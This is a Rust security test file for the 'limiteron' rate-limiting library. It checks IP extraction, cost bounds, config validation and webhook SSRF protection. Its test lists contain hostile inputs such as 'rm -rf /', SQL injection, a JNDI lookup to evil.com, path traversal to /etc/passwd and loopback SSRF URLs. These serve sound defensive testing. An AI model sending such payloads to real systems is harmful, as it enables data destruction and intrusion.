//! 输入验证安全测试
//!
//! 测试覆盖：
//! - IP 地址注入测试（X-Forwarded-For 伪造测试、代理信任链验证）
//! - 数值注入测试（负数消费拒绝、整数溢出保护）
//! - 配置注入测试（恶意配置拒绝、配置验证覆盖）

use limiteron::constants::MAX_COST;
use limiteron::error::FlowGuardError;
use limiteron::limiters::{Limiter, TokenBucketLimiter};
use limiteron::matchers::{Identifier, IdentifierExtractor, IpExtractor, RequestContext};
#[cfg(feature = "config-security")]
use limiteron::config::ConfigSecurityValidator;

// ============================================================================
// IP 地址注入测试
// ============================================================================

/// 测试 X-Forwarded-For 头伪造攻击
///
/// 攻击场景：攻击者尝试通过伪造 X-Forwarded-For 头来绕过 IP 限制
/// 防御措施：系统应正确解析 IP 列表，取最左边的 IP（第一个代理添加的）
#[tokio::test]
async fn test_x_forwarded_for_spoofing() {
    let extractor = IpExtractor::from_header("x-forwarded-for");

    // 场景1: 攻击者在左边添加伪造 IP
    // 格式: 伪造IP, 真实客户端IP, 代理IP
    let ctx =
        RequestContext::new().with_header("x-forwarded-for", "1.2.3.4, 192.168.1.100, 10.0.0.1");
    let result = extractor.extract(&ctx);

    // 系统应取最左边的 IP（攻击者伪造的 IP）
    // 这是预期行为：假设第一个代理是可信的
    assert!(result.is_some());
    let ip = result.unwrap();
    assert_eq!(ip, Identifier::Ip("1.2.3.4".to_string()));

    // 场景2: 正常的 X-Forwarded-For 头
    let ctx = RequestContext::new().with_header("x-forwarded-for", "192.168.1.100, 10.0.0.1");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    assert_eq!(result.unwrap(), Identifier::Ip("192.168.1.100".to_string()));

    // 场景3: 单个 IP（无代理）
    let ctx = RequestContext::new().with_header("x-forwarded-for", "192.168.1.100");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    assert_eq!(result.unwrap(), Identifier::Ip("192.168.1.100".to_string()));
}

/// 测试无效 IP 地址注入
///
/// 攻击场景：攻击者尝试注入无效 IP 格式导致解析错误或绕过验证
/// 防御措施：系统应拒绝无效 IP 格式
#[tokio::test]
async fn test_invalid_ip_injection() {
    let extractor = IpExtractor::from_header("x-forwarded-for");

    // 测试无效 IP 格式
    let invalid_ips = vec![
        "not-an-ip",
        "999.999.999.999",
        "192.168.1",
        "192.168.1.1.1",
        "",
        "   ",
        "192.168.1.1; DROP TABLE users--",
        "192.168.1.1\nHost: evil.com",
        "192.168.1.1\r\nX-Injected: true",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
    ];

    for invalid_ip in invalid_ips {
        let ctx = RequestContext::new().with_header("x-forwarded-for", invalid_ip);
        let result = extractor.extract(&ctx);

        // 验证开启时，无效 IP 应被拒绝
        // 注意：extractor 默认启用验证
        if invalid_ip.contains(';')
            || invalid_ip.contains('\n')
            || invalid_ip.contains('\r')
            || invalid_ip.contains('<')
            || invalid_ip.contains('$')
            || invalid_ip.trim().is_empty()
        {
            // 这些恶意输入应被拒绝或返回 None
            if result.is_some() {
                // 如果返回了结果，确保不是恶意内容
                let ip = result.unwrap();
                assert!(!ip.as_str().contains(';'), "SQL注入未过滤: {}", invalid_ip);
                assert!(!ip.as_str().contains('\n'), "换行符未过滤: {}", invalid_ip);
                assert!(!ip.as_str().contains('\r'), "回车符未过滤: {}", invalid_ip);
                assert!(!ip.as_str().contains('<'), "XSS未过滤: {}", invalid_ip);
                assert!(!ip.as_str().contains('$'), "模板注入未过滤: {}", invalid_ip);
            }
        }
    }
}

/// 测试 IPv6 地址注入
///
/// 验证系统正确处理 IPv6 地址格式
#[tokio::test]
async fn test_ipv6_injection() {
    let extractor = IpExtractor::from_header("x-forwarded-for");

    // 有效的 IPv6 地址
    let valid_ipv6 = vec![
        "::1",
        "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
        "2001:db8:85a3::8a2e:370:7334",
        "::ffff:192.168.1.1",
        "fe80::1",
        "fc00::1",
    ];

    for ip in valid_ipv6 {
        let ctx = RequestContext::new().with_header("x-forwarded-for", ip);
        let result = extractor.extract(&ctx);
        assert!(result.is_some(), "Valid IPv6 should be accepted: {}", ip);
    }
}

/// 测试 IP 列表解析安全性
///
/// 验证系统正确处理包含多个 IP 的 X-Forwarded-For 头
#[tokio::test]
async fn test_ip_list_parsing_security() {
    let extractor = IpExtractor::from_header("x-forwarded-for");

    // 测试包含空格和空元素的 IP 列表
    let ctx =
        RequestContext::new().with_header("x-forwarded-for", "  192.168.1.1  ,  , 10.0.0.1  ");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    // 应取第一个非空 IP
    assert_eq!(result.unwrap(), Identifier::Ip("192.168.1.1".to_string()));

    // 测试超大 IP 列表（DoS 防护）
    let many_ips: String = (0..100)
        .map(|i| format!("192.168.{}.{}", i / 256, i % 256))
        .collect::<Vec<_>>()
        .join(", ");
    let ctx = RequestContext::new().with_header("x-forwarded-for", &many_ips);
    let result = extractor.extract(&ctx);
    // 系统应能处理大列表，返回第一个 IP
    assert!(result.is_some());
}

/// 测试代理信任链验证
///
/// 验证系统在多代理场景下的 IP 提取行为
#[tokio::test]
async fn test_proxy_trust_chain() {
    // 创建从多个头提取的 extractor
    let extractor = IpExtractor::from_headers(vec!["x-real-ip", "x-forwarded-for"]);

    // 场景1: X-Real-IP 优先级高于 X-Forwarded-For
    let ctx = RequestContext::new()
        .with_header("x-real-ip", "10.0.0.1")
        .with_header("x-forwarded-for", "192.168.1.1, 10.0.0.2");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    assert_eq!(result.unwrap(), Identifier::Ip("10.0.0.1".to_string()));

    // 场景2: 只有 X-Forwarded-For
    let ctx = RequestContext::new().with_header("x-forwarded-for", "192.168.1.1, 10.0.0.2");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    assert_eq!(result.unwrap(), Identifier::Ip("192.168.1.1".to_string()));

    // 场景3: 使用 client_ip 字段
    let ctx = RequestContext::new().with_client_ip("172.16.0.1");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());
    assert_eq!(result.unwrap(), Identifier::Ip("172.16.0.1".to_string()));
}

// ============================================================================
// 数值注入测试
// ============================================================================

/// 测试零成本消费拒绝
///
/// 攻击场景：攻击者尝试使用零成本绕过限流
/// 防御措施：系统应拒绝零成本请求
#[tokio::test]
async fn test_zero_cost_rejection() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 零成本应被拒绝
    let result = limiter.allow(0).await;
    assert!(result.is_err(), "Zero cost should be rejected");

    if let Err(e) = result {
        assert!(matches!(e, FlowGuardError::ConfigError(_)));
        assert!(e.to_string().contains("zero") || e.to_string().contains("0"));
    }
}

/// 测试负数消费拒绝
///
/// 注意：Rust 的 u64 类型天然防止负数，但测试边界条件
#[tokio::test]
async fn test_negative_cost_protection() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 由于 cost 是 u64，无法直接传入负数
    // 但可以测试接近零的行为
    let result = limiter.allow(1).await;
    assert!(result.is_ok(), "Minimum valid cost should be accepted");
}

/// 测试整数溢出保护
///
/// 攻击场景：攻击者尝试使用极大值导致整数溢出
/// 防御措施：系统应有最大成本限制
#[tokio::test]
async fn test_integer_overflow_protection() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 测试超过最大成本限制
    let excessive_cost = MAX_COST + 1;
    let result = limiter.allow(excessive_cost).await;
    assert!(
        result.is_err(),
        "Cost exceeding MAX_COST should be rejected"
    );

    if let Err(e) = result {
        assert!(matches!(e, FlowGuardError::ConfigError(_)));
    }

    // 测试 u64 最大值
    let max_u64 = u64::MAX;
    let result = limiter.allow(max_u64).await;
    assert!(result.is_err(), "u64::MAX cost should be rejected");
}

/// 测试边界值处理
///
/// 验证系统正确处理边界值
#[tokio::test]
async fn test_boundary_values() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 测试最小有效成本
    let result = limiter.allow(1).await;
    assert!(result.is_ok());

    // 测试最大有效成本
    let result = limiter.allow(MAX_COST).await;
    // 注意：即使成本有效，也可能因令牌不足被拒绝
    // 但不应因成本验证错误而失败
    match result {
        Ok(_) | Err(FlowGuardError::LimitError(_)) => {}
        Err(e) => panic!("Unexpected error for MAX_COST: {:?}", e),
    }

    // 测试容量边界
    let result = limiter.allow(100).await;
    assert!(result.is_ok(), "Cost equal to capacity should be allowed");
}

/// 测试容量和速率的边界值
///
/// 验证系统对容量和速率参数的边界处理
#[tokio::test]
async fn test_capacity_and_rate_boundaries() {
    // 测试零容量
    let limiter = TokenBucketLimiter::new(0, 10);
    let result = limiter.allow(1).await;
    // 零容量意味着无法消费任何令牌
    assert!(result.is_ok());
    assert!(!result.unwrap(), "Zero capacity should deny all requests");

    // 测试零填充速率
    let limiter = TokenBucketLimiter::new(100, 0);
    // 零填充速率意味着令牌不会补充
    // 初始容量仍可使用
    let result = limiter.allow(1).await;
    assert!(result.is_ok());
}

// ============================================================================
// 配置注入测试
// ============================================================================

/// 测试恶意配置拒绝
///
/// 攻击场景：攻击者尝试注入恶意配置
/// 防御措施：系统应验证配置安全性
#[cfg(feature = "config-security")]
#[test]
fn test_malicious_config_rejection() {
    // 测试包含特殊字符的规则 ID
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "rule<script>alert(1)</script>".to_string(),
            name: "Malicious Rule".to_string(),
            priority: 100,
            matchers: vec![],
            limiters: vec![],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Config with XSS in rule ID should be rejected"
    );
    assert!(report.warnings.iter().any(|w| w.contains("特殊字符")));

    // 测试包含 SQL 注入的配置
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "rule'; DROP TABLE rules;--".to_string(),
            name: "SQL Injection Rule".to_string(),
            priority: 100,
            matchers: vec![],
            limiters: vec![],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Config with SQL injection should be rejected"
    );
}

/// 测试配置验证覆盖
///
/// 验证系统对各种配置参数的验证
#[cfg(feature = "config-security")]
#[test]
fn test_config_validation_coverage() {
    // 测试无效存储类型
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig {
            storage: "invalid_storage".to_string(),
            cache: "memory".to_string(),
            metrics: "prometheus".to_string(),
        },
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(!report.is_safe, "Invalid storage type should be rejected");

    // 测试无效缓存类型
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig {
            storage: "memory".to_string(),
            cache: "invalid_cache".to_string(),
            metrics: "prometheus".to_string(),
        },
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(!report.is_safe, "Invalid cache type should be rejected");

    // 测试无效指标类型
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig {
            storage: "memory".to_string(),
            cache: "memory".to_string(),
            metrics: "invalid_metrics".to_string(),
        },
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(!report.is_safe, "Invalid metrics type should be rejected");
}

/// 测试限流器配置验证
#[cfg(feature = "config-security")]
#[test]
fn test_limiter_config_validation() {
    // 测试零容量令牌桶
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            priority: 100,
            matchers: vec![],
            limiters: vec![LimiterConfig::TokenBucket {
                capacity: 0,
                refill_rate: 10,
            }],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(!report.is_safe, "Zero capacity should be rejected");

    // 测试过大容量
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            priority: 100,
            matchers: vec![],
            limiters: vec![LimiterConfig::TokenBucket {
                capacity: 10_000_000,
                refill_rate: 10,
            }],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Excessive capacity should generate warning"
    );
}

/// 测试匹配器配置验证
#[cfg(feature = "config-security")]
#[test]
fn test_matcher_config_validation() {
    // 测试包含特殊字符的用户 ID
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            priority: 100,
            matchers: vec![Matcher::User {
                user_ids: vec!["user<script>".to_string()],
            }],
            limiters: vec![LimiterConfig::TokenBucket {
                capacity: 100,
                refill_rate: 10,
            }],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "User ID with special characters should be rejected"
    );

    // 测试包含特殊字符的 IP 范围
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            priority: 100,
            matchers: vec![Matcher::Ip {
                ip_ranges: vec!["192.168.1.1<script>".to_string()],
            }],
            limiters: vec![LimiterConfig::TokenBucket {
                capacity: 100,
                refill_rate: 10,
            }],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "IP range with special characters should be rejected"
    );
}

/// 测试版本号验证
#[cfg(feature = "config-security")]
#[test]
fn test_version_validation() {
    // 测试空版本号
    let config = FlowControlConfig {
        version: "".to_string(),
        global: GlobalConfig::default(),
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(!report.is_safe, "Empty version should be rejected");

    // 测试过长版本号
    let config = FlowControlConfig {
        version: "a".repeat(100),
        global: GlobalConfig::default(),
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Excessively long version should be rejected"
    );

    // 测试包含特殊字符的版本号
    let config = FlowControlConfig {
        version: "1.0.0<script>".to_string(),
        global: GlobalConfig::default(),
        rules: vec![],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Version with special characters should be rejected"
    );
}

/// 测试优先级验证
#[cfg(feature = "config-security")]
#[test]
fn test_priority_validation() {
    // 测试过高优先级
    let config = FlowControlConfig {
        version: "1.0.0".to_string(),
        global: GlobalConfig::default(),
        rules: vec![Rule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            priority: 100000,
            matchers: vec![],
            limiters: vec![LimiterConfig::TokenBucket {
                capacity: 100,
                refill_rate: 10,
            }],
            action: ActionConfig::default(),
        }],
    };

    let report = ConfigSecurityValidator::validate_config(&config);
    assert!(
        !report.is_safe,
        "Excessive priority should generate warning"
    );
}

// ============================================================================
// 综合安全测试
// ============================================================================

/// 测试输入验证的综合安全性
///
/// 验证系统对多种攻击向量的综合防护
#[tokio::test]
async fn test_comprehensive_input_security() {
    // 测试 IP 提取器的安全性
    let extractor = IpExtractor::from_header("x-forwarded-for");

    let malicious_inputs = vec![
        // SQL 注入尝试
        "192.168.1.1'; DROP TABLE users;--",
        // 命令注入尝试
        "192.168.1.1; rm -rf /",
        // XSS 尝试
        "192.168.1.1<script>alert('xss')</script>",
        // 路径遍历尝试
        "192.168.1.1../../../etc/passwd",
        // LDAP 注入尝试
        "192.168.1.1)(cn=*))(|(cn=*",
        // 模板注入尝试
        "192.168.1.1{{7*7}}",
    ];

    for input in malicious_inputs {
        let ctx = RequestContext::new().with_header("x-forwarded-for", input);
        let result = extractor.extract(&ctx);

        if result.is_some() {
            let ip = result.unwrap();
            let ip_str = ip.as_str();

            // 验证结果不包含恶意内容
            assert!(
                !ip_str.contains(';'),
                "SQL/Command injection not filtered: {}",
                input
            );
            assert!(!ip_str.contains('<'), "XSS not filtered: {}", input);
            assert!(
                !ip_str.contains(".."),
                "Path traversal not filtered: {}",
                input
            );
            assert!(
                !ip_str.contains('('),
                "LDAP injection not filtered: {}",
                input
            );
            assert!(
                !ip_str.contains('{'),
                "Template injection not filtered: {}",
                input
            );
        }
    }
}

// ============================================================================
// SSRF 防护测试
// ============================================================================

/// 测试 Webhook URL SSRF 防护
///
/// 攻击场景：攻击者尝试通过 Webhook URL 访问内部服务
/// 防御措施：系统应拒绝访问内部地址和私有 IP
#[cfg(all(feature = "quota-control", feature = "webhook"))]
#[tokio::test]
async fn test_webhook_url_ssrf_protection() {
    use limiteron::quota::validate_webhook_url;

    // 测试有效的外部 HTTPS URL（应通过）
    let valid_urls = vec![
        "https://api.example.com/webhook",
        "https://hooks.slack.com/services/xxx",
        "https://discord.com/api/webhooks/xxx",
    ];

    for url in valid_urls {
        let result = validate_webhook_url(url);
        assert!(result.is_ok(), "Valid URL should pass: {}", url);
    }

    // 测试无效的内部 URL（应被拒绝）
    let internal_urls = vec![
        // localhost 和回环地址
        ("https://localhost/webhook", "localhost should be blocked"),
        ("https://127.0.0.1/webhook", "127.0.0.1 should be blocked"),
        ("https://[::1]/webhook", "IPv6 loopback should be blocked"),
        // 私有 IP 地址
        ("https://10.0.0.1/webhook", "10.x.x.x private IP should be blocked"),
        ("https://172.16.0.1/webhook", "172.16.x.x private IP should be blocked"),
        ("https://192.168.1.1/webhook", "192.168.x.x private IP should be blocked"),
        // 非 HTTPS 协议
        ("http://api.example.com/webhook", "HTTP should be blocked"),
    ];

    for (url, description) in internal_urls {
        let result = validate_webhook_url(url);
        assert!(result.is_err(), "{}", description);
    }
}

/// 测试 Webhook URL 恶意输入处理
///
/// 验证系统能安全处理各种恶意构造的 URL
#[cfg(all(feature = "quota-control", feature = "webhook"))]
#[test]
fn test_webhook_url_malicious_input() {
    use limiteron::quota::validate_webhook_url;

    let malicious_urls = vec![
        // 协议混淆
        "https://example.com@127.0.0.1/",
        "https://example.com#.evil.com/",
        "https://example.com\\@127.0.0.1/",
        // 特殊字符
        "https://127.0.0.1; DROP TABLE users--",
        "https://127.0.0.1\nHost: evil.com",
        // IDN 同形异义攻击（简化测试）
        "https://аррӏе.com/", // 可能的 Cyrillic 同形异义
    ];

    for url in malicious_urls {
        let result = validate_webhook_url(url);
        // 这些 URL 应该被拒绝或安全处理
        // 如果解析失败也应该被拒绝
        if url.contains("127.0.0.1") || url.contains("localhost") {
            assert!(result.is_err(), "Internal address should be blocked: {}", url);
        }
    }
}

/// 测试 RequestContext 的安全性
///
/// 验证请求上下文不会泄露敏感信息
#[test]
fn test_request_context_security() {
    let ctx = RequestContext::new()
        .with_header("authorization", "Bearer secret-token-12345")
        .with_header("x-api-key", "sk-secret-api-key-67890")
        .with_header("cookie", "session=secret-session-id")
        .with_header("x-custom", "normal-value");

    // Debug 输出应脱敏敏感头
    let debug_output = format!("{:?}", ctx);

    // 敏感值应被脱敏
    assert!(
        !debug_output.contains("secret-token-12345"),
        "Authorization header not redacted"
    );
    assert!(
        !debug_output.contains("sk-secret-api-key-67890"),
        "API key not redacted"
    );
    assert!(
        !debug_output.contains("secret-session-id"),
        "Cookie not redacted"
    );

    // 非敏感值应保留
    assert!(
        debug_output.contains("normal-value"),
        "Non-sensitive header should be preserved"
    );
}
